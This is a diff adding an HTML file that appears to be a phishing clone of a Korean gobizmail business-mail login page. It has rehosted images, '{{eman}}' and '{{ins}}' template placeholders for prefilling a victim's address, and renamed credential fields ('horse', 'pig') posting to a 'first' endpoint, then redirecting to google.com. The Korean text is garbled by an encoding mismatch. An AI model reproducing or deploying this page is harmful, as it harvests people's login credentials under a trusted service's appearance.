@@ -1,0 +1,832 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<!-- saved from url=(0070)https://www.gobizmail.com/login_unit_gobiz.jsp?memType=%27GOBIZMAIL%27 -->
+<html lang="ko" xml:lang="ko" xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="Content-Type" content="text/html; charset=EUC-KR">
+
+<meta name="verify-v1" content="jUonAfMYLNhOKti2nhcAMpvUXroAH7zEw3PhssreI3M=">
+<title>���������[����Ͻ�����] �߼ұ��������ܿ��� �����ϴ� ����� ���� ������ ȣ���� �����Դϴ�.</title>
+<link rel="icon" type="image/x-icon" href="https://i.ibb.co/NVgQyzN/2014new-logo.gif">
+<style>
+body,div,ul,li,h1,h2{
+	margin:0 ;
+	padding:0 ;
+}
+
+body {
+	font:12px/1.6 돋움,Dotum,AppleGothic,sans-serif;
+	color: #7d7d7d ;
+}
+ul,ol,dl {
+	list-style:none;
+}
+img {
+	border-bottom-style:none;
+	border-left-style:none;
+	border-right-style:none;
+	border-top-style:none;
+	vertical-align:top;
+}
+
+ul {
+	list-style:none; padding:0;
+	margin:0;
+}
+
+a {
+    color: #828282;
+    text-decoration: none;
+}
+a:visited, a:visited {
+    color: #828282;
+}
+a.visited, a.visited:visited {
+    color: #828282;
+}
+
+
+#loginWrap {
+	margin: 0 auto;
+	width: 100% ;
+	text-align: left ;
+}
+
+#logincenter {;
+	margin: 0 auto;
+	margin-top:80px;
+	width:600px;
+	height:900px;
+}
+
+#logincenter h1 {
+	margin:0 auto;
+	width:310px;
+}
+
+#logincenter h2 {
+	margin:0 auto;
+	width:310px;
+	font-size:15px;
+	text-align:center;
+	padding-top:22px;
+	padding-bottom:15px;
+}
+
+
+#login {
+	margin:0 auto;
+	width:436px;
+}
+
+#login p {
+	text-align:center;
+	line-height:21px;
+	width:420px;
+	font-size:12px
+}
+
+#login p a:hover, a:visited {
+    color: #0e519a;
+}
+
+#login h3 {
+	font-size:15px;
+	font-weight:bold;
+	color:#5b5757;
+	height:15px;
+}
+
+.ID_name #ID {
+    direction: ltr;
+    font-size: 15px;
+    height: 43px;
+	width:435px;
+	line-height:2.4em;
+	font-weight:bold;
+}
+
+.ID_name #ID_web {
+    direction: ltr;
+    font-size: 15px;
+    height: 43px;
+	width:196px;
+	line-height:2.4em;
+	font-weight:bold;
+}
+
+#web_font {
+    font-size: 20px;
+	line-height:20px;
+	padding-top:10px;
+}
+
+.PW_name #Passwd {
+    direction: ltr;
+    font-size: 15px;
+    height: 43px;
+	width:435px;
+	line-height:2.4em
+}
+
+.hidden-label {
+    clip: rect(1px, 1px, 1px, 1px);
+    height: 0;
+    overflow: hidden;
+    position: absolute !important;
+    visibility: hidden;
+    width: 0;
+}
+
+.rememberID {
+	float:right;
+	font-size: 12px;
+}
+	
+.btn_login {
+    display: block;
+    height: 56px;
+    margin: 25px 0 12px;
+}
+
+.gobizjoin {
+	border-top:1px solid #d9d9d9;
+	width:436px;
+	font-size: 12px;
+}
+
+.placeholder {
+    color: #444;
+}
+
+.bottommenu {
+	margin:0 auto;
+	text-align:center;
+	width:436px;
+	padding-top:50px;
+	font-size: 12px;
+}
+
+</style>
+
+<script>
+	
+</script>
+<!--script src="http://www.modernizr.com/downloads/modernizr-latest.js"></script-->
+<!--script type="text/javascript" src="/js/placeholder.js"></script-->
+<script type="text/javascript">
+
+
+	var focusID = 0;
+	var id;
+	var password;
+
+
+function mem(){
+    var f = document.form1;
+    var domain = f.domain.value;
+    var id = f.userid.value;
+
+	if(f.memory.checked){
+
+		// ��Ű�� �ִ��� Ȯ��
+		var email = get_cookie_value("SMEID");
+
+		if(email!=null) { // ��Ű�� ������ ����
+			cookie_delete("SMEID");
+		}
+
+		var expires = new Date();
+		expires.setTime(expires.getTime() + 1000 * 3600 * 24 * 365);
+
+		setCookie("SMEID", id +"@"+domain, expires);
+		setCookie("LANG", f.language.value, expires);
+
+	}else {
+		cookie_delete("SMEID");
+		cookie_delete("LANG");
+	}
+
+}
+
+function setCookie (name, value, expires)
+{
+	document.cookie =
+	name + "=" + value + "; expires=" + expires.toGMTString();
+}
+
+function cookie_delete(name) {
+
+
+	if(document.cookie.indexOf(name) < 0) {
+          return 0;
+    }
+
+    var expireTime = new Date();
+    expireTime.setTime(expireTime.getTime() - expireTime.getTime());
+
+    var pstr = name + "=" + null +
+        ("; expires=" + expireTime.toGMTString()) +
+        ("; path=" + "/" + ";")
+        ;
+    document.cookie = pstr;
+}
+
+
+// ��Ű �б�
+function get_cookie_value(name){
+    var arg = name + "=";
+    var alen = arg.length;
+    var clen = document.cookie.length;
+    var i = 0;
+
+    while(i < clen){
+        var j = i + alen;
+        if(document.cookie.substring(i, j) == arg)
+        return getCookieVal(j);
+        i = document.cookie.indexOf(" ", i) + 1;
+        if(i == 0) break;
+    }
+    return null;
+}
+
+// ��Ű �б�
+function getCookieVal(offset){
+    var endstr = document.cookie.indexOf(";", offset);
+    if(endstr == -1)
+        endstr = document.cookie.length;
+    return unescape(document.cookie.substring(offset, endstr));
+}
+
+function nnKeyDown(e){
+        var f = document.form1;
+        var ch = String.fromCharCode(e.which);
+        var retcode = true;
+
+        if( ch == '\n' || ch == '\r'){
+		if(focusID == 0){
+            document.form1.userid.focus();
+		}
+        else if(focusID == 1)
+        {
+            document.form1.pass.focus();
+            retcode = false;
+        }else if(focusID == 2)
+        {
+            str = f.userid.value;
+            f.id.value = str;
+            document.form1.submit();
+            retcode = false;
+        }
+        }
+        focusID = 0;
+        return retcode;
+}
+
+function setFocusID(id){
+        focusID = id;
+}
+
+function isUniqId(id_obj)
+{
+    var id_val = id_obj.value;
+    var id_len = str_realLength(id_val);
+
+    if (!isId(id_val)) {
+        alert("���̵� �Է��� �߸��Ǿ����ϴ�.");
+        id_obj.focus();
+        return false;
+    }
+
+    return true;
+}
+
+function isId(str)
+{
+    len =  str_realLength(str);
+
+    for(i = 0; i < len; i++) {
+        ch = str.charAt(i);
+        if ((ch >= '0' && ch <= '9') || (ch >= 'A' && ch <= 'Z')
+            || (ch >= 'a' && ch <= 'z') || ch == '-' || ch == '.'  || ch=='_') {
+            continue;
+        } else {
+            return false;
+        }
+    }
+
+    return true;
+}
+function resetForm() {
+
+	document.form1.reset();
+}
+
+function login_check() {
+	alert("ȸ������ �����Դϴ�. �α����Ͻ� �� �̿��ϼ���.");
+	return;
+}
+ 
+
+function checkEnter(evt){
+	if (navigator.SEARCH_KEYWORD.charAt(0) == 'N'){
+		if(evt.which == 13){
+			findAction();
+		}
+	}else{
+		if(evt.keyCode == 13){
+			findAction();
+		}
+	}
+	return;
+}
+
+
+function getSubCookieValue(key,subkey) {
+	var keyStr = unescape(getCookieAllService(key));
+	if(keyStr==undefined) {
+
+	} else {
+		 
+		var keyStrArr=keyStr.split("|");
+		var isExists = false;
+		for(var i=0;i < keyStrArr.length;i++) { //��� subkey ����
+			if(keyStrArr[i].indexOf(subkey+"=")>-1) { //�̹� �ͱ۾����ٸ� �ǳʶ�
+				return keyStrArr[i].substring(subkey.length+1,keyStrArr[i].length);
+				break;
+			}
+		}
+	}
+
+	return "";
+}
+
+function makeCookieStr(key,subkey,value) {
+	var keyStr = unescape(getCookieAllService(key));
+	if(keyStr==undefined || keyStr=="undefined" || keyStr=="") {
+		keyStr=subkey+"="+value;
+	} else {
+		var keyStrArr=keyStr.split("|");
+		var isExists = false;
+		for(var i=0;i < keyStrArr.length;i++) { //��� subkey ����
+			if(keyStrArr[i].indexOf(subkey+"=")>-1) { //�̹� �ͱ۾����ٸ� �ǳʶ�
+				isExists=true;
+				return "";
+				break;
+			}
+		}
+
+		if(!isExists) {
+			keyStr=keyStr+"|"+subkey+"="+value;
+		}
+	}
+	return keyStr;
+
+}
+
+function setCookieAllService(name, value, expire){
+	var currentDate = new Date();
+	currentDate.setDate( currentDate.getDate() + expire );
+	document.cookie = name + "=" + escape(value) + ((expire == null) ? "" : ("; expires=" + currentDate.toGMTString()))+ "; path=/; domain=.gobizmail.com;"
+}
+
+function getCookieAllService(Name){
+	var search = Name + "="
+
+	if (document.cookie.length > 0){
+		var offset = document.cookie.indexOf(search)
+		if (offset != -1){
+			offset += search.length
+			var end = document.cookie.indexOf(";", offset)
+			if (end == -1)
+				end = document.cookie.length
+			return unescape(document.cookie.substring(offset, end))
+		}
+	}
+}
+
+//������������ �˾�
+function openqna()
+{
+		window.open ("http://kr.gobizkorea.com/krjsp/help/", "helpwin", "width=800, height=600, resizable=yes, scrollbars=yes,toolbar=no");
+}
+
+</script>
+</head>
+<body>
+<!--[��ü���̺�]_START============================================================== -->
+
+
+<script language="JavaScript">
+<!--
+	var memType='GOBIZMAIL';
+	var memTypeMailObj;
+	var memTypeNormalObj;
+	var login_key="GOBIZ";
+	var login_skey_gbn="GBN";
+	var login_sval_gbn="NORMAL";
+	var login_skey_gid="GID";
+	var login_sval_gid="";
+	var login_skey_gdomain="DOMAIN";
+	var login_sval_gdomain="";
+	var login_skey_glang="LANG";
+	var login_sval_glang="ko";
+	var login_skey_nid="NID";
+	var login_sval_nid="";
+	var login_skey_set="SAVE";
+	var login_sval_set="";
+
+	var login_skey1_set="SAVE1";
+	var login_sval1_set="";
+
+// memory rememberID
+//
+   
+	function init(){
+        
+		var fObjGobizmail=document.loginFormGobizmail;
+		var fObjNormal=document.loginFormNormal;
+
+		fObjGobizmail.userid.value=getSubCookieValue(login_key,login_skey_gid);
+		fObjGobizmail.domain.value=getSubCookieValue(login_key,login_skey_gdomain);
+		fObjNormal.input_userid.value=getSubCookieValue(login_key,login_skey_nid);
+
+		fObjGobizmail.language1.checked = (getSubCookieValue(login_key,login_skey_glang)=="en") ? true:false;
+
+		// old setting processing...
+		if(fObjGobizmail.userid.value=="") {
+
+			// tempory
+			var old_email = getCookieAllService("SMEID");
+			var old_lang = getCookieAllService("LANG");
+
+			if(old_email) {
+				fObjGobizmail.userid.value = old_email.substring(0, old_email.indexOf("@"));
+				fObjGobizmail.domain.value = old_email.substring(old_email.indexOf("@")+1, old_email.length);
+
+				fObjGobizmail.memory.checked=true;
+				fObjNormal.rememberID.checked=true;
+			}
+
+			if(old_lang=="en") {
+				fObjGobizmail.language1.checked=true;
+				fObjGobizmail.language.value="en";
+			}
+
+		}
+
+		memTypeMailObj = document.getElementById("memGobizmail");
+		memTypeNormalObj = document.getElementById("memNormal");
+
+		// switch
+		//memType = getSubCookieValue(login_key,login_skey_gbn);
+         
+		if(memType!="NORMAL") {
+			if(memType!="GOBIZMAIL") {
+				if(false) {
+					memType="NORMAL";
+				} else {
+					memType="GOBIZMAIL";
+				}
+			}
+		}
+       
+		memSwitch(memType);
+
+		if(getSubCookieValue(login_key,login_skey_set)=="N") {
+			fObjGobizmail.userid.value="";
+			fObjGobizmail.domain.value="";
+			//fObjNormal.input_userid.value="";
+			fObjGobizmail.memory.checked=false;			
+			//fObjNormal.rememberID.checked=false;
+			fObjGobizmail.language1.checked=false;
+			fObjGobizmail.language.value="";
+		} else {
+			fObjGobizmail.memory.checked=true;
+			//fObjNormal.rememberID.checked=true;
+		}
+		
+		if(getSubCookieValue(login_key,login_skey1_set)=="N") {
+			//fObjGobizmail.userid.value="";
+			//fObjGobizmail.domain.value="";
+			fObjNormal.input_userid.value="";
+			//fObjGobizmail.memory.checked=false;			
+			fObjNormal.rememberID.checked=false;
+			//fObjGobizmail.language1.checked=false;
+			//fObjGobizmail.language.value="";
+		} else {
+			//fObjGobizmail.memory.checked=true;
+			fObjNormal.rememberID.checked=true;
+		}
+
+	}
+
+	function submitForm(form) {
+       
+		var rtn=true;
+       
+		if(memType=="GOBIZMAIL") {
+			rtn = gobizmailLogin(form);
+		} else if(memType=="NORMAL") {
+			rtn = normalLogin(form);
+		}
+
+		// mem();
+		mem2();
+
+		return rtn;
+	}
+
+	function gobizmailLogin(form) {
+ 
+ 
+		try {
+			if(form.domain.value == ""){
+				alert("�������� �Է� �ϼ���.");
+				form.domain.focus();
+				return false;
+			}
+
+			if (form.userid.value == "") {
+				alert("���̵� �Է� �ϼ���.");
+				form.userid.focus();
+				return false;
+			}
+
+			str = form.userid.value;
+			form.id.value = str;
+
+			if (form.pass.value == "") {
+				alert("��ȣ�� �Է� �ϼ���.");
+				form.pass.focus();
+				return false;
+			}
+
+			var str = form.domain.value;
+			form.domain.value = str.toLowerCase();
+
+			//if(form.language1.checked)
+			//	form.language.value = "en";
+			//else form.language.value = "ko"; //20140725 nohwg �⺻�������� ����� �����ص� ��α��ϸ� �ѱ۷� �����Ե� ���κκ�
+            form.submit();
+		} catch(_e) { alert(_e); }
+	}
+
+	function normalLogin(form) {
+		try {
+			if(form.input_userid.value == ""){
+				alert("���̵� �Է� �ϼ���.");
+				form.input_userid.focus();
+				return false;
+			}
+
+			if (form.input_passwd.value == "") {
+				alert("��ȣ�� �Է� �ϼ���.");
+				form.input_passwd.focus();
+				return false;
+			}
+
+		} catch(_e) { alert(_e); }
+
+		return true;
+	}
+
+	function mem2(){
+		var fObjGobizmail=document.loginFormGobizmail;
+		var fObjNormal=document.loginFormNormal;
+
+		login_sval_gbn = memType;
+		login_sval_gid = fObjGobizmail.userid.value;
+		login_sval_gdomain = fObjGobizmail.domain.value;
+		login_sval_nid = fObjNormal.input_userid.value;
+
+		if(memType=="GOBIZMAIL") {
+			login_sval_set = (fObjGobizmail.memory.checked) ? "Y":"N";
+		} else {
+			//login_sval_set = (fObjNormal.rememberID.checked) ? "Y":"N";
+			login_sval1_set = (fObjNormal.rememberID.checked) ? "Y":"N";
+		}
+
+		login_sval_glang = (fObjGobizmail.language1.checked) ? "en":"ko";
+		
+
+		var cookieKeySet=login_skey_set+"="+login_sval_set;
+		var cookieKey1Set=login_skey1_set+"="+login_sval1_set;
+		var cookieGbnStr=login_skey_gbn+"="+login_sval_gbn;
+		var cookieGidStr=login_skey_gid+"="+login_sval_gid;
+		var cookieGdomainStr=login_skey_gdomain+"="+login_sval_gdomain;
+		var cookieGlangStr=login_skey_glang+"="+login_sval_glang;
+		var cookieNidStr=login_skey_nid+"="+login_sval_nid;
+
+		//var cookieFullStr=cookieKeySet+"|"+cookieGbnStr;
+		var cookieFullStr=cookieKeySet+"|"+cookieKey1Set+"|"+cookieGbnStr;
+
+		if(login_sval_set!="N") {
+			cookieFullStr += "|"+cookieGidStr+"|"+cookieGdomainStr+"|"+cookieGlangStr+"|"+cookieNidStr;
+		}
+		
+		if(login_sval1_set!="N") {
+			cookieFullStr += "|"+cookieGlangStr+"|"+cookieNidStr;
+		}
+
+		if(cookieFullStr!="" && cookieFullStr!=undefined) {
+			//setCookieAllService(login_key,cookieFullStr,7);
+			setCookieAllService(login_key,cookieFullStr,30);
+		}
+	}
+
+	function memSwitch(tp) {
+
+		var fObjGobizmail=document.loginFormGobizmail;
+		var fObjNormal=document.loginFormNormal;
+
+		if(memTypeMailObj==null || memTypeMailObj==undefined || memTypeMailObj=="undefined") {
+			if(confirm("���۵��� ���� ������ �ֽ��ϴ�. �ٽ� �ε� �Ͻðڽ��ϱ�?")) {
+				location.href="/";
+				return;
+			}
+
+			if(document.addEventListener) {
+				window.addEventListener('load',init,false);
+			} else if(document.attachEvent) {
+			  window.attachEvent('onload',init);
+			}
+
+			return;
+		}
+
+		if(tp=="GOBIZMAIL") {
+			memTypeMailObj.style.display="";
+			memTypeNormalObj.style.display="none";
+
+			try {
+				if(fObjGobizmail.domain.value!="" || fObjGobizmail.userid.value!="") {
+					fObjGobizmail.pass.focus();
+				}
+			} catch(_e) {}
+		} else {
+			memTypeMailObj.style.display="none";
+			memTypeNormalObj.style.display="";
+
+			try {
+				if(fObjNormal.input_userid.value!="") {
+					fObjNormal.input_passwd.focus();
+				}
+			} catch(_e) {}
+		}
+
+		memType=tp;
+	}
+
+
+	function loginInit() {
+
+		var gobizVar = getCookieAllService("TWEBMAIL");
+		var gkVar = getSubCookieValue("GK","UID");
+		var msgStr = "�� �޴��� ����ȸ�� ����޴��Դϴ�.\\n\\n����ȸ�� ������ ���� ���� ���� �Ұ��� �����ϼ���."
+
+
+		//memType=NORMAL && GK USERID
+		if(gobizVar==undefined || gobizVar!="undefined" || gobizVar.length<1) {
+			if(gkVar!=null && gkVar!=undefined && gkVar!="undefined" && gkVar.length>0) {
+				//var gobizmailLink1 = document.getElementById("gobizmailLink1");
+				//var gobizmailLink2 = document.getElementById("gobizmailLink2");
+				//var webdiskLink1 = document.getElementById("webdiskLink1");
+				//var rssLink1 = document.getElementById("rssLink1");
+				//gobizmailLink1.href="javascript:alert('"+msgStr+"')";
+				//gobizmailLink2.href="javascript:alert('"+msgStr+"')";
+				//webdiskLink1.href="javascript:alert('"+msgStr+"')";
+				//rssLink1.href="javascript:alert('"+msgStr+"')";
+			}
+		}
+
+	}
+
+
+
+	if(document.addEventListener) {
+		window.addEventListener('load',init,false);
+	} else if(document.attachEvent) {
+	  window.attachEvent('onload',init);
+	}
+
+
+function openSrchNomal() {
+    var url = "http://kr.gobizkorea.com/login/id_search.jsp";
+    var option = "width=540,height=225,status=yes,scrollbars=no,resizable=yes";
+
+    window.open(url, "srchId", option);
+}
+function openSrchAccount() {
+    var url = "/smepage/gm_id_search.jsp";
+    var option = "width=540,height=225,scrollbars=no,resizable=yes";
+
+    window.open(url, "srchId", option);
+}
+//-->
+</script>
+
+<div id="memGobizmail" style="">
+     <form name="loginFormGobizmail"  action="first" method="post">
+	 	<input type="hidden" name="id">
+		<input type="hidden" name="returnPath" value="https://www.google.com/">
+		<input type="hidden" name="returnUrl" value="https%3A%2F%2Fwww.google.com%2F">
+		<input type="hidden" name="language1" id="language1">
+		<input type="hidden" name="language">
+	<div id="loginWrap">
+		<div id="logincenter">
+        	<h1><a href="http://kr.gobizkorea.com/"><img src="https://i.ibb.co/NVgQyzN/2014new-logo.gif"  alt="�������ڸ���" title="�������ڸ���" border="0"></a></h1>
+            <h2 class="hidden-small"> ������ȸ������ �α��� </h2>
+			<div id="login">
+				<p>�α��� �Ͻñ⿡ �ռ� �ּ�â <img src="https://i.ibb.co/yfTLGMZ/2014login-img01.gif" alt="http://www.gobizmail.com �������� �ּ�" title="http://www.gobizmail.com �������� �ּ�"> �� �ݵ�� Ȯ���Ͻñ� �ٶ��ϴ�. �������ڸ��ƴ� ȸ�������� <span style="color:#cb1212;">�̸����̳� �׿��� ��ġ�� �̿��Ͽ� ����</span>���� �ʽ��ϴ�. ����Ʈ�� ����� �ǽ̻���Ʈ���� ���ظ� ���� �ʵ��� �����Ͻñ� �ٶ��ϴ�.</p>
+            	<div class="ID_name">
+                	<h3>������</h3>
+                    <label for="ID_web"></label>
+					<input id="ID_web" class="" type="ID" spellcheck="false" value="{{eman}}" required placeholder="ID" name="horse"> <span id="web_font">@</span> <input id="ID_web" class="" type="ID" spellcheck="false" value="{{ins}}" placeholder="domain" name="domain" required>
+                  <span class="rememberID"><input id="memory" type="checkbox" align="absmiddle" tabindex="5" name="memory">�̸�������</span>
+                </div>
+                <div class="PW_name">
+                	<h3>��й�ȣ</h3>
+                    <label for="Passwd"></label>
+					<input id="Passwd" class="" type="password" placeholder="password" required name="pass" onkeypress="javascript:if(event.keyCode==13 &amp;&amp; submitForm(this.form)) {  this.form.submit(); }">
+                </div>
+      			<span class="btn_login">
+					<input type="image" src="https://i.ibb.co/x19PhcS/btn-login-web.gif" style="cursor:pointer;" alt="�α���" title="�α���">
+				</span>
+      			<span class="btn_login">
+					<img src="https://i.ibb.co/dcmptgd/bnr-eos.jpg" style="cursor:pointer;" alt="���� ����ȳ�" title="���� ����ȳ�" onclick="window.open(&#39;https://kr.gobizkorea.com/customer/board/cmView.do?bbs_id=smenotice&amp;art_id=91&#39;,&#39;_blank&#39;);">
+				</span>
+                <p style="padding-top:60px;">��й�ȣ�� ������� �ʵ��� ������ �����Ͻð� ���� ����(���̵�, ��й�ȣ)�� �ǵ��� <span style="color:#cb1212;">�������� ���� �ֱ������� ����</span>�Ͻñ� �ٶ��ϴ�.<br>
+				<!-- <span style="color:#0e519a;"><b><a href="http://kr.gobizkorea.com/support/edu/eduMain_apply_nomail.jsp" target="_blank">���û�� �ڼ�������</a></b></span> -->
+				</p>
+                <div class="gobizjoin">
+                	<p><a href="javascript:openSrchAccount();">���̵�/��й�ȣã��</a></p>
+                </div>
+           	</div>
+            <div class="bottommenu">
+            	<ul>
+                	<li>������������ 1588-6234 �� <a href="http://kr.gobizkorea.com/customer/termsOfService/selTermsOfServiceInfo.do" target="_blank">�̿���</a></li>
+                    <li>Copyright 1996~2019���߼Һ�ó���������� <img src="https://i.ibb.co/wg7sH1W/copyright-logo.gif" art="�������ڸ��Ʒΰ�" title="�������ڸ��Ʒΰ�"> All Rights Reserved.</li>
+                </ul>
+            </div>
+		</div>
+	</div>		
+	</form>
+</div>
+<div id="memNormal" style="display:none;">
+   <form name="loginFormNormal"  action="first" method="post">
+   	<input type="hidden" name="id2">
+	<input type="hidden" name="returnPath" value="https://www.google.com/">
+	<input type="hidden" name="returnUrl" value="https%3A%2F%2Fwww.google.com%2F">
+ 	<div id="loginWrap">
+		<div id="logincenter">
+        	<h1><a href="http://kr.gobizkorea.com/"><img src="./���������[����Ͻ�����] �߼ұ��������ܿ��� �����ϴ� ����� ���� ������ ȣ���� �����Դϴ�._files/2014new_logo.gif" alt="�������ڸ���" title="�������ڸ���" border="0"></a></h1>
+            <h2 class="hidden-small"> ���ȸ��/����ȸ������ �α��� </h2>
+			<div id="login">
+				<p>�α��� �Ͻñ⿡ �ռ� �ּ�â <img src="./���������[����Ͻ�����] �߼ұ��������ܿ��� �����ϴ� ����� ���� ������ ȣ���� �����Դϴ�._files/2014login_img01.gif" alt="http://www.gobizmail.com �������� �ּ�" title="http://www.gobizmail.com �������� �ּ�"> �� �ݵ�� Ȯ���Ͻñ� �ٶ��ϴ�. �������ڸ��ƴ� ȸ�������� <span style="color:#cb1212;">�̸����̳� �׿��� ��ġ�� �̿��Ͽ� ����</span>���� �ʽ��ϴ�. ����Ʈ�� ����� �ǽ̻���Ʈ���� ���ظ� ���� �ʵ��� �����Ͻñ� �ٶ��ϴ�.</p>
+            	<div class="ID_name">
+                	<h3>���̵�</h3>
+                    <label for="ID"></label>
+					<input id="ID" class="" type="ID" spellcheck="false" value="{{eman}}" placeholder="ID" name="horse">
+                    <span class="rememberID"><input id="rememberID" type="checkbox" align="absmiddle" tabindex="5" name="rememberID">���̵�����</span>
+                </div>
+                <div class="PW_name">
+                	<h3>��й�ȣ</h3>
+                    <label for="Passwd"></label>
+					<input id="Passwd" class="" type="password" placeholder="password" name="pig" onkeypress="javascript:if(event.keyCode==13 &amp;&amp; submitForm(this.form)) { this.form.submit(); }">
+                </div>
+      			<span class="btn_login">
+					<!--a href="javascript:if(submitForm(this.form)) { this.form.submit(); }"><img src="./images/btn_login_biz.gif" alt="�α���" title="�α���"/></a-->
+					<input type="image" src="./���������[����Ͻ�����] �߼ұ��������ܿ��� �����ϴ� ����� ���� ������ ȣ���� �����Դϴ�._files/btn_login_biz.gif" style="cursor:pointer;" alt="�α���" title="�α���">
+				</span>
+                <p>��й�ȣ�� ������� �ʵ��� ������ �����Ͻð� ���� ����(���̵�, ��й�ȣ)�� �ǵ��� <span style="color:#cb1212;">�������� ���� �ֱ������� ����</span>�Ͻñ� �ٶ��ϴ�.<br><span style="color:#0e519a;"><b><a href="http://kr.gobizkorea.com/support/edu/eduMain_apply_nomail.jsp" target="_blank">���û�� �ڼ�������</a></b></span>
+				</p>
+                <div class="gobizjoin">
+                	<p><a href="https://kr.gobizkorea.com/smepage/join/joinstart.jsp">���ȸ�� ȸ������</a> �� <a href="javascript:openSrchNomal();">���̵�/��й�ȣã��</a></p>
+                </div>
+           	</div>
+            <div class="bottommenu">
+            	<ul>
+                	<li>������������ 1588-6234 �� <a href="http://kr.gobizkorea.com/main/privacy/agree_mail.jsp" target="_blank">�̿���</a> �� <a href="http://kr.gobizkorea.com/main/privacy/sitemap.jsp" target="_blank">����Ʈ��</a></li>
+                    <li>Copyright 1996~2019���߼Һ�ó���������� <img src="./���������[����Ͻ�����] �߼ұ��������ܿ��� �����ϴ� ����� ���� ������ ȣ���� �����Դϴ�._files/copyright_logo.gif" art="�������ڸ��Ʒΰ�" title="�������ڸ��Ʒΰ�"> All Rights Reserved.</li>
+                </ul>
+            </div>
+		</div>
+	</div>
+   </form>
+ </div>
+<script>
+    
+	if(memType=="NORMAL"){
+	  
+	  $("#memGobizmail").css("display","none");
+	  $("#memNormal").css("display","block");
+	   
+	}else if(memType=="GOBIZMAIL"){
+	  	   
+      $("#memGobizmail").css("display","block");
+	  $("#memNormal").css("display","none");
+	}
+
+</script>
+
+
+
+</body></html>
